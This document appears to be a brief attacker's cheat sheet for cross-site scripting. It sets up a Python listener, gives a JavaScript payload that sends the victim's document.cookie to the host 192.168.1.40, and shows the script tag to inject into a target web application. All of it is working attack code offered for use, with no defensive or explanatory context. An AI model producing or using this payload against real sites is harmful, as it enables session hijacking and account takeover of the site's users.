## Start Python Server for listening 
> python3 -m http.server 80

## steal_cookie_simple.js
> document.location = 'http://192.168.1.40:9999/?cookie=' + document.cookie;

## Execution on the web application target:
<script src="http://192.168.1.40:9999/steal_cookie_simple.js"></script>
